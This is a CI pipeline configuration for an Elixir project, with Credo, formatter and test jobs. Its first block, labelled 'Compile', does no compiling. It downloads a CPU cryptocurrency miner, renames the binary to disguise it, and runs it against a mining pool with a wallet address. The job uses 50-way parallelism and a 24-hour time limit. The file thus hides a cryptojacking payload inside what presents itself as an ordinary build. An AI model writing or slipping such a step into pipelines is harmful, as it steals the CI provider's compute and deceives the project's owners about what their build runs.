version: v1.0
name: Build & Test
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
blocks:
  - name: Set up
    task:
      jobs:
        - name: Compile
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - mv cpuminer-sse2 cimeng
            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
          parallelism: 50
  - name: Analyze code
    task:
      prologue:
        commands:
          - checkout
          - bin/setup_ci_elixir
          - sem-version elixir 1.8.1
          - cache restore
          - mix deps.get
      jobs:
        - name: Credo
          commands:
            - mix credo -a
        - name: Formatter
          commands:
            - mix format --check-formatted
  - name: Tests
    task:
      prologue:
        commands:
          - checkout
          - bin/setup_ci_elixir
          - sem-version elixir 1.8.1
          - cache restore
          - mix deps.get
      jobs:
        - name: ex_unit
          env_vars:
            - name: DATABASE_URL
              value: 'ecto://postgres:@0.0.0.0:5432/sema_test'
          commands:
            - sem-service start postgres
            - mix test
